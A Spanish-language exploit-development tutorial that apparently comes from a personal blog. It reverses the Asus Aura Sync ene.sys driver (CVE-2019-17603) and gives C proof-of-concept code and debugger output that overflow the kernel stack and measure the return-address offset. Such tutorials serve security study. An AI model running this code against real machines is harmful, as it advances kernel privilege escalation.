<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Stack Overflow</title>

  <meta name="description" content="Explotación de un Stack Overflow en modo kernel">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Stack Overflow">
  <meta name="twitter:description" content="Explotación de un Stack Overflow en modo kernel">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/exploit-development/windows-kernel/stack-overflow/image.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Stack Overflow">
  <meta property="og:description" content="Explotación de un Stack Overflow en modo kernel">
  <meta property="og:image" content="/exploit-development/windows-kernel/stack-overflow/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploit-development/windows-kernel/stack-overflow/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Stack Overflow" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploit-development/windows-kernel" title="xchg2pwn" class="blog-button">Windows Kernel Mode</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://linkedin.com/in/xchg2pwn" title="Linkedin" target="_blank">
                  <i class="icon icon-social-linkedin"></i>
                  <span class="label">Linkedin</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#reversing">Reversing Driver</a></li>
        <li><a href="#trigger">Overflow Trigger</a></li>
        <li><a href="#exploit">Initial Exploit</a></li>
        <li><a href="#smep">SMEP Bypass</a></li>
        <li><a href="#cr4">CR4 Method</a></li>
        <li><a href="#pte">PTE Method</a></li>
    </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploit-development/windows-kernel/stack-overflow/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Stack Overflow</h2><br>
  </header>

<p class="plain-text">En este post se llevará a cabo la explotación de una vulnerabilidad ahora en modo kernel, para ello usaremos una de las más conocidas: un Stack Overflow, para ello instalaremos <a href="https://asus.com/mx/site/aura/sync.html">Asus Aura Sync</a> en su versión <code class="language-plaintext highlighter-rouge">1.07.71</code>, que según el <a href="https://nvd.nist.gov/vuln/detail/cve-2019-17603">CVE-2019-17603</a> tiene una vulnerabilidad en el driver <a href="https://github.com/xchg2pwn/ExploitDevelopment/blob/main/AuraSync_1.07.71/ene.sys">ene.sys</a> que se instala a la par del programa, y este contiene un manejo de datos incorrecto permitiendo así escalar privilegios.</p>

<section class="post" id="reversing">
<br><h3 class="post-title">Reversing Driver</h3><br>    

<p class="plain-text">Luego de instalar el programa o simplemente cargar el driver con <code class="language-plaintext highlighter-rouge">sc.exe</code>, desde la máquina debugger deberíamos ser capaces de poder ver el módulo <code class="language-plaintext highlighter-rouge">ene</code> cargado.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">lm m ene
Browse full module list
start             end                 module name
fffff807`7bdc0000 fffff807`7bdc7000   ene        (deferred)</span>
</code></pre></div></div><br>

<p class="plain-text">Si miramos la información sobre el driver vemos que su <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code> se encuentra en un offset de <code class="language-plaintext highlighter-rouge">0x1100</code> a partir de la base del driver, esta estructura es la encargada de gestionar las acciones que realizan los diferentes códigos <code class="language-plaintext highlighter-rouge">ioctl</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">!drvobj \driver\ene 2
Driver object (ffff990ab5239530) is for:
 \Driver\Ene

DriverEntry:   fffff8077bdc6064	ene
DriverStartIo: 00000000	
DriverUnload:  fffff8077bdc14c0	ene
AddDevice:     00000000	

Dispatch routines:
[00] IRP_MJ_CREATE                      fffff8077bdc1100	ene+0x1100
[01] IRP_MJ_CREATE_NAMED_PIPE           fffff8075fd10770	nt!IopInvalidDeviceRequest
[02] IRP_MJ_CLOSE                       fffff8077bdc1100	ene+0x1100
[03] IRP_MJ_READ                        fffff8075fd10770	nt!IopInvalidDeviceRequest
[04] IRP_MJ_WRITE                       fffff8075fd10770	nt!IopInvalidDeviceRequest
[05] IRP_MJ_QUERY_INFORMATION           fffff8075fd10770	nt!IopInvalidDeviceRequest
[06] IRP_MJ_SET_INFORMATION             fffff8075fd10770	nt!IopInvalidDeviceRequest
[07] IRP_MJ_QUERY_EA                    fffff8075fd10770	nt!IopInvalidDeviceRequest
[08] IRP_MJ_SET_EA                      fffff8075fd10770	nt!IopInvalidDeviceRequest
[09] IRP_MJ_FLUSH_BUFFERS               fffff8075fd10770	nt!IopInvalidDeviceRequest
[0a] IRP_MJ_QUERY_VOLUME_INFORMATION    fffff8075fd10770	nt!IopInvalidDeviceRequest
[0b] IRP_MJ_SET_VOLUME_INFORMATION      fffff8075fd10770	nt!IopInvalidDeviceRequest
[0c] IRP_MJ_DIRECTORY_CONTROL           fffff8075fd10770	nt!IopInvalidDeviceRequest
[0d] IRP_MJ_FILE_SYSTEM_CONTROL         fffff8075fd10770	nt!IopInvalidDeviceRequest
[0e] IRP_MJ_DEVICE_CONTROL              fffff8077bdc1100	ene+0x1100
[0f] IRP_MJ_INTERNAL_DEVICE_CONTROL     fffff8075fd10770	nt!IopInvalidDeviceRequest
[10] IRP_MJ_SHUTDOWN                    fffff8075fd10770	nt!IopInvalidDeviceRequest
[11] IRP_MJ_LOCK_CONTROL                fffff8075fd10770	nt!IopInvalidDeviceRequest
[12] IRP_MJ_CLEANUP                     fffff8075fd10770	nt!IopInvalidDeviceRequest
[13] IRP_MJ_CREATE_MAILSLOT             fffff8075fd10770	nt!IopInvalidDeviceRequest
[14] IRP_MJ_QUERY_SECURITY              fffff8075fd10770	nt!IopInvalidDeviceRequest
[15] IRP_MJ_SET_SECURITY                fffff8075fd10770	nt!IopInvalidDeviceRequest
[16] IRP_MJ_POWER                       fffff8075fd10770	nt!IopInvalidDeviceRequest
[17] IRP_MJ_SYSTEM_CONTROL              fffff8075fd10770	nt!IopInvalidDeviceRequest
[18] IRP_MJ_DEVICE_CHANGE               fffff8075fd10770	nt!IopInvalidDeviceRequest
[19] IRP_MJ_QUERY_QUOTA                 fffff8075fd10770	nt!IopInvalidDeviceRequest
[1a] IRP_MJ_SET_QUOTA                   fffff8075fd10770	nt!IopInvalidDeviceRequest
[1b] IRP_MJ_PNP                         fffff8075fd10770	nt!IopInvalidDeviceRequest</span>
</code></pre></div></div><br>

<p class="plain-text">Lo primero es entender como funciona el driver, para ello podemos desensamblar el driver utilizando <code class="language-plaintext highlighter-rouge">IDA</code>, iniciaremos por el <code class="language-plaintext highlighter-rouge">DriverEntry</code>, este bloque llama a la función <code class="language-plaintext highlighter-rouge">IoCreateDevice</code>, esta función establece un nombre de dispositivo, en este caso es a través de <code class="language-plaintext highlighter-rouge">\\.\EneIo</code>, esta es la forma en la que nos comunicaremos con el driver.</p>
<a href="/exploit-development/windows-kernel/stack-overflow/1.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/1.png"></p></div></a>

<p class="plain-text">Una vez creado el objeto se configura la tabla <code class="language-plaintext highlighter-rouge">Dispatch Routines</code>, donde podemos encontrar <code class="language-plaintext highlighter-rouge">IoCtlHandler</code> que renombramos así ya que el offset coincide con el que vimos al inicio desde <code class="language-plaintext highlighter-rouge">WinDbg</code>, el offset pertenece a <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code>.</p>
<a href="/exploit-development/windows-kernel/stack-overflow/2.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/2.png"></p></div></a>

<p class="plain-text">Identificada la función encargada de despachar las funciones vamos a analizar la función <code class="language-plaintext highlighter-rouge">IoCtlHandler</code>, aquí cada función se identifica con un código <code class="language-plaintext highlighter-rouge">ioctl</code>, nuestro driver acepta estas llamadas usando estructuras de tipo <code class="language-plaintext highlighter-rouge">IRP</code> o <code class="language-plaintext highlighter-rouge">I/O Request Packets</code>.</p>
<a href="/exploit-development/windows-kernel/stack-overflow/3.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/3.png"></p></div></a>

<p class="plain-text">El driver decide que hacer dependiendo el tipo de solicitud que recibió, compara el primer byte del registro <code class="language-plaintext highlighter-rouge">rsi</code> o el campo <code class="language-plaintext highlighter-rouge">Major Function</code> contra los valores de <code class="language-plaintext highlighter-rouge">0x0</code>, <code class="language-plaintext highlighter-rouge">0x2</code> y <code class="language-plaintext highlighter-rouge">0xe</code>, que corresponden a las estructuras <code class="language-plaintext highlighter-rouge">IRP_MJ_CREATE</code>, <code class="language-plaintext highlighter-rouge">IRP_MJ_CLOSE</code> e <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code>, la última nos interesa ya que queremos comunicarnos.</p>
<a href="/exploit-development/windows-kernel/stack-overflow/4.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/4.png"></p></div></a>

<p class="plain-text">Si el byte es <code class="language-plaintext highlighter-rouge">0xe</code> significa que nos comunicaremos a través de códigos <code class="language-plaintext highlighter-rouge">ioctl</code> por lo que inicia una estructura tipo <code class="language-plaintext highlighter-rouge">switch</code> para buscar el código <code class="language-plaintext highlighter-rouge">ioctl</code> correspondiente, iniciaremos con el primer código que es <code class="language-plaintext highlighter-rouge">0x80102040</code> y analizaremos lo que ejecuta.</p>
<a href="/exploit-development/windows-kernel/stack-overflow/8.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/8.png"></p></div></a>

<p class="plain-text">El siguiente bloque nuevamente muestra un mensaje, y hace un salto condicional, si <code class="language-plaintext highlighter-rouge">ebx</code> es igual a <code class="language-plaintext highlighter-rouge">0</code> que significaría que la longitud de nuestros datos es nula y no enviamos datos, por lo que debemos de seguir la línea roja del salto condicional <code class="language-plaintext highlighter-rouge">jz</code>.</p>
<a href="/exploit-development/windows-kernel/stack-overflow/5.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/5.png"></p></div></a>

<p class="plain-text">Siguiendo la linea roja vemos que utiliza la función <code class="language-plaintext highlighter-rouge">memmove</code> sin ninguna sanitización aparente ya que realmente nosotros controlamos la longitud, ya que controlamos los datos si escribimos mas de lo que soporta podriamos ocasionar un Buffer Overflow.</p>
<a href="/exploit-development/windows-kernel/stack-overflow/6.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/6.png"></p></div></a>

<p class="plain-text">Después de copiar los datos siempre vuelve al final de la función que concluye en la instrucción <code class="language-plaintext highlighter-rouge">ret</code> del offset <code class="language-plaintext highlighter-rouge">0x14b8</code>, si pasamos el buffer y sobrescribimos la dirección de retorno en este ultimo <code class="language-plaintext highlighter-rouge">ret</code> deberiamos tomar el control del flujo del programa.</p>
<a href="/exploit-development/windows-kernel/stack-overflow/7.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/7.png"></p></div></a>

</section>
<section class="post" id="trigger">
<br><h3 class="post-title">Stack Overflow Trigger</h3><br>

<p class="plain-text">Utilizando <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> podemos comunicarnos pasandole el handle y el código <code class="language-plaintext highlighter-rouge">ioctl</code> perteneciente a la función, además de ello el <code class="language-plaintext highlighter-rouge">buffer</code> que le pasaremos y su tamaño, el resto de parámetros los dejaremos como <code class="language-plaintext highlighter-rouge">NULL</code> ya que no nos interesan.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">BOOL </span><span class="na">DeviceIoControl</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">HANDLE</span><span class="p">       hDevice,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">DWORD</span><span class="p">        dwIoControlCode,
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">optional</span><span class="p">]      </span><span class="no">LPVOID</span><span class="p">       lpInBuffer,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">DWORD</span><span class="p">        nInBufferSize,
  [</span><span class="mi">out</span><span class="p">, </span><span class="mi">optional</span><span class="p">]     </span><span class="no">LPVOID</span><span class="p">       lpOutBuffer,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">DWORD</span><span class="p">        nOutBufferSize,
  [</span><span class="mi">out</span><span class="p">, </span><span class="mi">optional</span><span class="p">]     </span><span class="no">LPDWORD</span><span class="p">      lpBytesReturned,
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">out</span><span class="p">,</span><span class="mi"> optional</span><span class="p">] </span><span class="no">LPOVERLAPPED</span><span class="p"> lpOverlapped
);</span>
</code></pre></div></div><br>

<p class="plain-text">En un proyecto de <code class="language-plaintext highlighter-rouge">Visual Studio</code> definimos el siguiente código, iniciamos definiendo un buffer llamado <code class="language-plaintext highlighter-rouge">payload</code> con un tamaño de <code class="language-plaintext highlighter-rouge">100</code> bytes, (un poco más del buffer definido) el cual rellenaremos con <code class="language-plaintext highlighter-rouge">A's</code>, luego de eso lo enviamos al controlador.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>

</span><span class="o">#define</span><span class="na"> IOCTL_STACK_OVERFLOW </span><span class="mi">0x80102040

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">EneIo"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">LPVOID</span><span class="p"> payload</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 100</span><span class="p">, MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlFillMemory(payload, </span><span class="mi">100</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);

    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload, </span><span class="mi">100</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Para ver lo que está haciendo el ultimo bloque reverseado estableceremos un <code class="language-plaintext highlighter-rouge">breakpoint</code> en la llamada a <code class="language-plaintext highlighter-rouge">memmove</code> y continuaremos la ejecución normal.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">bp ene + 0x142b

</span><span class="ro">0: kd> </span><span class="p">g</span>
</code></pre></div></div><br>

<p class="plain-text">Al compilar el proyecto nuestro exploit nos queda en un <code class="language-plaintext highlighter-rouge">.exe</code> que ejecutaremos.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">exploit.exe</span>
</code></pre></div></div><br>

<p class="plain-text">Volviendo al debugger vemos que en el kernel hemos alcanzado el <code class="language-plaintext highlighter-rouge">breakpoint</code> a la llamada, así que analizaremos el comportamiento de esta llamada a <code class="language-plaintext highlighter-rouge">memmove</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">g
Breakpoint 0 hit
ene+0x142b:
fffff803`66fe142b e810040000      call    ene+0x1840 (fffff803`66fe1840)</span>
</code></pre></div></div><br>

<p class="plain-text">Según la documentación oficial de Microsoft, la función <a href="https://learn.microsoft.com/es-es/cpp/c-runtime-library/reference/memmove-wmemmove?view=msvc-170">memmove</a> recibe en total 3 argumentos, un puntero al buffer de destino, un puntero al source y un contador.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">void </span><span class="o">*</span><span class="na">memmove</span><span class="p">(
    </span><span class="no">void </span><span class="o">*</span><span class="p">dest,
    </span><span class="o">const </span><span class="no">void </span><span class="o">*</span><span class="p">src,
    </span><span class="na">size_t </span><span class="p">count
);</span>
</code></pre></div></div><br>

<p class="plain-text">Las <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">convenciones de llamada</a> en x64 nos dicen que los primeros 3 argumentos deberian estar en los registros <code class="language-plaintext highlighter-rouge">rcx</code>, <code class="language-plaintext highlighter-rouge">rdx</code> y <code class="language-plaintext highlighter-rouge">r8</code>, en <code class="language-plaintext highlighter-rouge">rcx</code> podemos ver el destino, en <code class="language-plaintext highlighter-rouge">rdx</code> el source o lo que se va a copiar y en <code class="language-plaintext highlighter-rouge">r8</code> el contador que son <code class="language-plaintext highlighter-rouge">100</code> bytes.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">db rcx
ffffaa04`6ac8b7b0  0e 00 00 00 0e e4 ff ff-18 f2 3c 06 0e e4 ff ff  ..........<.....
ffffaa04`6ac8b7c0  49 6f 20 20 00 00 00 00-00 00 00 00 00 00 00 00  Io  ............
ffffaa04`6ac8b7d0  00 00 00 00 04 aa ff ff-70 f9 cc 60 03 f8 ff ff  ........p..`....
ffffaa04`6ac8b7e0  00 f1 3c 06 0e e4 ff ff-c5 21 cd 60 03 f8 ff ff  ..<......!.`....
ffffaa04`6ac8b7f0  02 00 00 00 00 00 00 00-8e 41 3b 61 03 f8 ff ff  .........A;a....
ffffaa04`6ac8b800  80 00 84 07 0e e4 ff ff-80 00 84 07 0e e4 ff ff  ................
ffffaa04`6ac8b810  00 00 00 00 00 00 00 00-01 00 00 00 00 00 00 00  ................
ffffaa04`6ac8b820  00 f1 3c 06 0e e4 ff ff-01 c8 04 61 03 f8 ff ff  ..<........a....

</span><span class="ro">0: kd></span><span class="p"> db rdx
ffffe40e`07d3d440  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffffe40e`07d3d450  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffffe40e`07d3d460  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffffe40e`07d3d470  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffffe40e`07d3d480  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffffe40e`07d3d490  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffffe40e`07d3d4a0  41 41 41 41 00 00 00 00-00 00 00 00 00 00 00 00  AAAA............
ffffe40e`07d3d4b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

</span><span class="ro">0: kd></span><span class="p"> ? r8
Evaluate expression: 100 = 00000000`00000064</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de ejecutar la llamada podemos ver que el contenido del buffer se ha copiado al destino, sin embargo hay que pensar que posiblemente el buffer definido sea mas pequeño que nuestro buffer, nosotros hemos escrito un total de <code class="language-plaintext highlighter-rouge">100</code> bytes.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">p
ene+0x1430:
fffff803`66fe1430 488b542430      mov     rdx,qword ptr [rsp+30h]

</span><span class="ro">0: kd></span><span class="p"> db 0xffffaa046ac8b7b0
ffffaa04`6ac8b7b0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffffaa04`6ac8b7c0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffffaa04`6ac8b7d0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffffaa04`6ac8b7e0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffffaa04`6ac8b7f0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffffaa04`6ac8b800  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffffaa04`6ac8b810  41 41 41 41 00 00 00 00-01 00 00 00 00 00 00 00  AAAA............
ffffaa04`6ac8b820  00 f1 3c 06 0e e4 ff ff-01 c8 04 61 03 f8 ff ff  ..<........a....</span>
</code></pre></div></div><br>

<p class="plain-text">Avanzamos hasta el siguiente <code class="language-plaintext highlighter-rouge">ret</code> donde podemos ver que hemos sobrescrito la dirección de retorno con <code class="language-plaintext highlighter-rouge">0x4141414141414141</code> que es igual a las <code class="language-plaintext highlighter-rouge">A's</code> en hexadecimal, si intentamos continuar provocará un error ya que esa dirección no existe, de esta forma controlamos la dirección donde apuntará mediante un Stack Buffer Overflow.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">pt
ene+0x14b8:
fffff803`66fe14b8 c3              ret

</span><span class="ro">0: kd></span><span class="p"> dqs rsp L1
ffffaa04`6ac8b7e8  41414141`41414141

</span><span class="ro">0: kd></span><span class="p"> p
Access violation - code c0000005 (!!! second chance !!!)
ene+0x14b8:
fffff803`66fe14b8 c3              ret</span>
</code></pre></div></div><br>

<p class="plain-text">Para encontrar la cantidad de bytes necesarios antes de sobrescribir la dirección de retorno crearemos un patrón de caractéres con la función <code class="language-plaintext highlighter-rouge">cyclic</code> de pwntools.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cyclic </span><span class="p">-n 8 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora en lugar de rellenar el buffer payload con <code class="language-plaintext highlighter-rouge">A's</code> copiaremos al buffer los <code class="language-plaintext highlighter-rouge">100</code> bytes que creamos usando <code class="language-plaintext highlighter-rouge">cyclic</code>, después de ello compilamos otra vez el exploit.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>

</span><span class="o">#define</span><span class="na"> IOCTL_STACK_OVERFLOW </span><span class="mi">0x80102040

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">EneIo"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">CONST CHAR </span><span class="o">*</span><span class="p">cyclic</span><span class="o"> =</span><span class="s"> "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa"</span><span class="p">;

    </span><span class="na">LPVOID</span><span class="p"> payload</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 100</span><span class="p">, MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(payload, cyclic, </span><span class="mi">100</span><span class="p">);

    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload,</span><span class="mi"> 100</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">El breakpoint ahora será directamente en el <code class="language-plaintext highlighter-rouge">ret</code> donde se produce la vulnerabilidad.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">bp ene + 0x14b8

</span><span class="ro">0: kd></span><span class="p"> g</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de ejecutar el exploit podemos ver que la dirección de retorno ahora tiene como valor algunos de los bytes que contenia la cadena creada con <code class="language-plaintext highlighter-rouge">cyclic</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">exploit.exe</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">g
Breakpoint 0 hit
ene+0x14b8:
fffff803`1bbc14b8 c3              ret

</span><span class="ro">0: kd></span><span class="p"> dqs rsp L1
fffffe02`179d47e8  61616161`61616168</span>
</code></pre></div></div><br>

<p class="plain-text">Ya con la dirección podemos calcular el offset nuevamente utilizando <code class="language-plaintext highlighter-rouge">cyclic</code>, esa es la cantidad de bytes necesarios antes de sobrescribir la dirección de retorno.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cyclic </span><span class="p">-n 8 -l 0x6161616161616168
56</span>
</code></pre></div></div><br>

